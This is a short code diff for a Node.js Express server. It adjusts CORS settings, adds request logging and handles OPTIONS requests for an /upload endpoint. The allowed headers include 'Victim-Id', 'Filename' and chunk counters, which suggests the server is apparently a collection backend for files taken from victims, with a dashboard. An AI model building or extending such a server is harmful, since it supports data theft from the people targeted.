@@ -16,14 +16,31 @@ const sslOptions = {
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin: 'https://deobfrontend-n6m566v6o-2naseernoors-projects.vercel.app', // Allow only this origin
-  methods: ['GET', 'POST', 'OPTIONS'], // Allow these methods
-  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'], // Allow these headers
-  credentials: true, // Allow credentials (if needed)
+  origin: 'https://deobfrontend-n6m566v6o-2naseernoors-projects.vercel.app',
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
+  credentials: true,
 };
 
-app.use(cors(corsOptions)); // Enable CORS with the specified options
-app.options('*', cors(corsOptions)); // Respond to all OPTIONS requests with CORS headers
+app.use(cors(corsOptions));
+
+// Log all incoming requests for debugging
+app.use((req, res, next) => {
+  console.log('Request Headers:', req.headers);
+  console.log('Request Method:', req.method);
+  console.log('Request URL:', req.url);
+  next();
+});
+
+// Handle OPTIONS requests for /upload
+app.options('/upload', (req, res) => {
+  console.log('Handling OPTIONS request for /upload');
+  res.header('Access-Control-Allow-Origin', 'https://deobfrontend-n6m566v6o-2naseernoors-projects.vercel.app');
+  res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type, Victim-Id, Filename, Chunk-Index, Total-Chunks');
+  res.header('Access-Control-Allow-Credentials', 'true');
+  res.status(204).end(); // Respond with no content
+});
 
 // Serve the dashboard as static files
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
